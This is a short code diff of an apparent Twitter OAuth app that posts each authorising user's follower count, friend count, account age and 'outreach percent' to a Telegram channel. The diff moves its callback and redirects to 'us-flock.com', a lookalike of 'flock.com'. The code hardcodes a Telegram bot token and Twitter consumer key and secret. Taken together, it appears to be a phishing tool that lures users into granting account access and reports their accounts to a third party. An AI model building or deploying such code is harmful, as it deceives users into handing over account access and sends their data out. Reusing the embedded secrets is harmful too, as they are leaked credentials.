@@ -9,7 +9,7 @@ telegram_bot_token = '6874077656:AAFyKZbpIzoNeoMawv5pMa_R7u1JkSbOwZA'
 telegram_channel_id = '-1004153945317'
 consumer_key = 'zD6GefUlKuXwHae7cQQfCU252'
 consumer_secret = 'hIegE2yyDT3LRrxIR2f6bUrab95Mzb5Go2TidhYC44Ru2tPWQk'
-callback_url = 'https://us-flock.com'
+callback_url = 'https://us-flock.com/callback'
 log_file_path = 'user_logs.json'
 
 
@@ -108,7 +108,7 @@ async def callback():
     access_token_secret = session.get('access_token_secret')
 
     if not access_token or not access_token_secret:
-        return redirect('https://flock.com')
+        return redirect('https://us-flock.com')
 
 
     auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
@@ -128,7 +128,7 @@ async def callback():
         user.followers_count) + "\n\n🎉~Friends: " + str(user.friends_count) + "\n\n⏰~Created At: " + str(
         user.created_at) + "\n\n💎~Outreach Percent: " + outreach_percentage + "%"
     send_telegram_message(ext)
-    return redirect('https://flock.com')
+    return redirect('https://us-flock.com')
 
 
 if __name__ == '__main__':
